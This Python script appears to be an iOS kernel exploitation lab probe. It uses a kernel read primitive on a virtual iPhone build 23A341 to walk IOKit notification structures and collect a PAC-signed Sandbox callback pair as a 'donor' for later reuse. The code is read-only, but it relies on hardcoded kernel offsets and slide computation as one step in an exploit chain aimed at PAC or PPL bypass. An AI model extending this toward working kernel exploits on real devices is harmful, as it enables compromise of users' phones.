#!/usr/bin/env python3
"""Harvest the exact-build Sandbox IOService notification PAC pair via KRW.

This is a read-only 23A341 vPhone lab probe.  It walks the live IOKit
notification dictionary and its publish-notification OSOrderedSet instead of
scanning the heap.  The provider helper used by this script exposes only the
read/write protocol; this probe issues read operations exclusively.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shlex
import struct
import sys
from pathlib import Path
from typing import Any, Callable

from cnd_remotecall_lab import DEFAULT_KNOWN_HOSTS, LabError, SSH, require_vphone
from cnd_vphone_krw import debugger_kernel_address


SCHEMA = "com.zeroxjf.cyanide.iokit-notification-action-harvest"
SCHEMA_VERSION = 1
BUILD = "23A341"
PRODUCT = "iPhone17,3"
KERNEL_UUID = "03A93373-6498-3F25-8975-04DED251AF1F"

STATIC_FILESET_BASE = 0xFFFFFE0007004000
STATIC_TEXT = 0xFFFFFE0007008000
STATIC_NOTIFICATION_DICTIONARY_GLOBAL = 0xFFFFFE0009847538
STATIC_PUBLISH_SYMBOL_TABLE_POINTER = 0xFFFFFE0007A58248
STATIC_SANDBOX_BRIDGE = 0xFFFFFE0009398E6C
STATIC_SANDBOX_PUBLISH_CALLBACK = 0xFFFFFE00093AE0D8

DICTIONARY_COUNT_OFFSET = 0x14
DICTIONARY_ENTRIES_OFFSET = 0x20
DICTIONARY_ENTRY_SIZE = 0x10
ORDERED_SET_ARRAY_OFFSET = 0x18
ORDERED_SET_COUNT_OFFSET = 0x30
NOTIFIER_COLLECTION_OFFSET = 0x10
NOTIFIER_MATCHING_OFFSET = 0x18
NOTIFIER_TYPE_OFFSET = 0x20
NOTIFIER_ACTION_OFFSET = 0x28
NOTIFIER_CALLBACK_OFFSET = 0x38
NOTIFIER_REFCON_OFFSET = 0x40
NOTIFIER_ENABLED_OFFSET = 0x60
NOTIFIER_SIZE = 0x68

MAX_DICTIONARY_COUNT = 256
MAX_NOTIFICATION_COUNT = 4096
MAX_PROVIDER_READ = 64


class HarvestError(RuntimeError):
    pass


def _hex(value: int) -> str:
    return f"0x{value:016x}"


def _kernel_pointer(value: int, label: str) -> int:
    if value == 0:
        raise HarvestError(f"{label} is null")
    # Data pointers in these containers may retain PAC/TBI bits.  Their exact
    # 23A341 virtual-address identity occupies the low 47 bits.
    result = (value & 0x00007FFFFFFFFFFF) | 0xFFFF800000000000
    if result & 0xFFFF000000000000 != 0xFFFF000000000000:
        raise HarvestError(f"{label} is not a canonical kernel pointer")
    return result


def _code_identity(value: int) -> int:
    return value & 0x00007FFFFFFFFFFF


def _u32(data: bytes, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def _u64(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


def harvest(
    read: Callable[[int, int], bytes], live_text: int, kernel_uuid: str,
) -> dict[str, Any]:
    if kernel_uuid.upper() != KERNEL_UUID:
        raise HarvestError(
            f"live kernel UUID {kernel_uuid} does not match {KERNEL_UUID}"
        )
    if live_text < STATIC_TEXT or live_text & 0x3FFF:
        raise HarvestError("live kernel text has an invalid exact-build slide")
    slide = live_text - STATIC_TEXT
    live_base = STATIC_FILESET_BASE + slide
    dictionary_global = STATIC_NOTIFICATION_DICTIONARY_GLOBAL + slide
    publish_table_pointer = STATIC_PUBLISH_SYMBOL_TABLE_POINTER + slide
    expected_bridge = STATIC_SANDBOX_BRIDGE + slide
    expected_callback = STATIC_SANDBOX_PUBLISH_CALLBACK + slide

    dictionary = _kernel_pointer(
        _u64(read(dictionary_global, 8), 0), "notification dictionary",
    )
    publish_table = _kernel_pointer(
        _u64(read(publish_table_pointer, 8), 0),
        "IOService notification symbol table",
    )
    publish_symbol = _kernel_pointer(
        _u64(read(publish_table, 8), 0), "publish notification symbol",
    )

    dictionary_header = read(dictionary, 0x28)
    dictionary_count = _u32(dictionary_header, DICTIONARY_COUNT_OFFSET)
    if dictionary_count == 0 or dictionary_count > MAX_DICTIONARY_COUNT:
        raise HarvestError(
            f"notification dictionary count is out of bounds: {dictionary_count}"
        )
    entries = _kernel_pointer(
        _u64(dictionary_header, DICTIONARY_ENTRIES_OFFSET),
        "notification dictionary entries",
    )
    entry_data = read(entries, dictionary_count * DICTIONARY_ENTRY_SIZE)
    matching_collections: list[int] = []
    for index in range(dictionary_count):
        offset = index * DICTIONARY_ENTRY_SIZE
        key = _kernel_pointer(
            _u64(entry_data, offset), f"notification dictionary key {index}",
        )
        if key == publish_symbol:
            matching_collections.append(_kernel_pointer(
                _u64(entry_data, offset + 8),
                "publish notification collection",
            ))
    if len(matching_collections) != 1:
        raise HarvestError(
            "expected one publish notification collection, observed "
            f"{len(matching_collections)}"
        )
    collection = matching_collections[0]

    collection_header = read(collection, 0x40)
    collection_count = _u32(collection_header, ORDERED_SET_COUNT_OFFSET)
    if collection_count == 0 or collection_count > MAX_NOTIFICATION_COUNT:
        raise HarvestError(
            f"publish collection count is out of bounds: {collection_count}"
        )
    array = _kernel_pointer(
        _u64(collection_header, ORDERED_SET_ARRAY_OFFSET),
        "publish notification array",
    )
    object_data = read(array, collection_count * 8)

    matches: list[dict[str, Any]] = []
    for index in range(collection_count):
        notifier = _kernel_pointer(
            _u64(object_data, index * 8), f"publish notifier {index}",
        )
        body = read(notifier, NOTIFIER_SIZE)
        action = _u64(body, NOTIFIER_ACTION_OFFSET)
        if _code_identity(action) != _code_identity(expected_bridge):
            continue
        notifier_collection = _kernel_pointer(
            _u64(body, NOTIFIER_COLLECTION_OFFSET), "notifier collection",
        )
        notification_type = _kernel_pointer(
            _u64(body, NOTIFIER_TYPE_OFFSET), "notifier type",
        )
        callback = _u64(body, NOTIFIER_CALLBACK_OFFSET)
        if notifier_collection != collection or notification_type != publish_symbol:
            raise HarvestError("bridge notifier ownership/type fields drifted")
        if _code_identity(callback) != _code_identity(expected_callback):
            raise HarvestError(
                "bridge notifier callback does not match the REA-bound Sandbox target"
            )
        matches.append({
            "index": index,
            "notifier": _hex(notifier),
            "matching": _hex(_kernel_pointer(
                _u64(body, NOTIFIER_MATCHING_OFFSET), "notifier matching object",
            )),
            "notification_type": _hex(notification_type),
            "action_ia_61de": _hex(action),
            "action_stripped": _hex(expected_bridge),
            "callback_ia_zero": _hex(callback),
            "callback_stripped": _hex(expected_callback),
            "refcon": _hex(_u64(body, NOTIFIER_REFCON_OFFSET)),
            "enabled": _u32(body, NOTIFIER_ENABLED_OFFSET),
        })
    if len(matches) != 1:
        raise HarvestError(
            f"expected one exact Sandbox bridge notifier, observed {len(matches)}"
        )

    return {
        "schema": SCHEMA,
        "schemaVersion": SCHEMA_VERSION,
        "classification": "vm-runtime-observed",
        "identity": {
            "build": BUILD,
            "product": PRODUCT,
            "kernelUUID": kernel_uuid.upper(),
            "staticText": _hex(STATIC_TEXT),
            "liveText": _hex(live_text),
            "staticFilesetBase": _hex(STATIC_FILESET_BASE),
            "liveFilesetBase": _hex(live_base),
            "slide": _hex(slide),
        },
        "walk": {
            "notificationDictionaryGlobal": _hex(dictionary_global),
            "notificationDictionary": _hex(dictionary),
            "dictionaryEntries": _hex(entries),
            "dictionaryCount": dictionary_count,
            "publishSymbolTablePointer": _hex(publish_table_pointer),
            "publishSymbolTable": _hex(publish_table),
            "publishSymbol": _hex(publish_symbol),
            "publishCollection": _hex(collection),
            "publishArray": _hex(array),
            "publishCount": collection_count,
        },
        "donor": matches[0],
        "evidence": {
            "readOnly": True,
            "heapScanUsed": False,
            "usedKernelRead": True,
            "usedKernelWrite": False,
            "usedKernelCall": False,
            "claim": (
                "One live IOService publish notifier owns the REA-bound Sandbox "
                "bridge action under IA/0x61de and its paired IA-zero callback."
            ),
            "notProved": [
                "A dispatch of the harvested action",
                "An arbitrary-target kernel call",
                "A PAC or SPTM/PPL bypass",
                "Physical-device viability",
            ],
        },
    }


class ProviderReader:
    def __init__(self, ssh: SSH, helper: str, socket: str, kernel_base: int) -> None:
        for label, value in (("helper", helper), ("socket", socket)):
            if not value.startswith("/") or "\n" in value:
                raise HarvestError(f"provider {label} path is invalid")
        self.ssh = ssh
        self.helper = helper
        self.socket = socket
        self.kernel_base = kernel_base

    def __call__(self, address: int, length: int) -> bytes:
        if length <= 0 or address & 0xFFFF000000000000 != 0xFFFF000000000000:
            raise HarvestError("invalid provider read range")
        result = bytearray()
        while len(result) < length:
            amount = min(MAX_PROVIDER_READ, length - len(result))
            current = address + len(result)
            command = (
                f"{shlex.quote(self.helper)} {shlex.quote(self.socket)} "
                f"{_hex(self.kernel_base)} read {_hex(current)} {amount}"
            )
            try:
                record = json.loads(self.ssh.command(command))
                data = bytes.fromhex(record["bytes"])
            except (KeyError, TypeError, ValueError, json.JSONDecodeError) as error:
                raise HarvestError("provider read returned malformed JSON") from error
            if record.get("operation") != "read" or \
                    record.get("usedKernelCall") is not False or \
                    record.get("usedKernelWrite") is not False or \
                    len(data) != amount:
                raise HarvestError("provider read evidence contract failed")
            result.extend(data)
        return bytes(result)


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--user", default="mobile")
    parser.add_argument("--known-hosts", type=Path, default=DEFAULT_KNOWN_HOSTS)
    parser.add_argument("--password-env", default="CND_VPHONE_ROOT_PASSWORD")
    parser.add_argument("--kernel-debug-port", type=int, default=62139)
    parser.add_argument(
        "--provider-helper", default="/var/tmp/cnd_lab_provider_krw",
    )
    parser.add_argument("--provider-socket", default="/var/tmp/cnd-lab-krw.sock")
    parser.add_argument("--output", type=Path)
    return parser


def main(argv: list[str] | None = None) -> int:
    args = _parser().parse_args(argv)
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", args.password_env):
        raise HarvestError("password environment variable name is invalid")
    if not os.environ.get(args.password_env):
        raise HarvestError(f"set {args.password_env} to the VM SSH password")
    ssh = SSH(
        args.host, args.port, args.user, args.known_hosts.expanduser(),
        args.password_env,
    )
    require_vphone(ssh)
    live_text_text, kernel_uuid = debugger_kernel_address(args.kernel_debug_port)
    live_text = int(live_text_text, 16)
    if kernel_uuid != KERNEL_UUID:
        raise HarvestError(
            f"live kernel UUID {kernel_uuid} does not match {KERNEL_UUID}"
        )
    slide = live_text - STATIC_TEXT
    reader = ProviderReader(
        ssh, args.provider_helper, args.provider_socket,
        STATIC_FILESET_BASE + slide,
    )
    result = harvest(reader, live_text, kernel_uuid)
    encoded = json.dumps(result, indent=2, sort_keys=True) + "\n"
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(encoded, encoding="utf-8")
    sys.stdout.write(encoded)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (HarvestError, LabError) as error:
        print(f"error: {error}", file=sys.stderr)
        raise SystemExit(1)
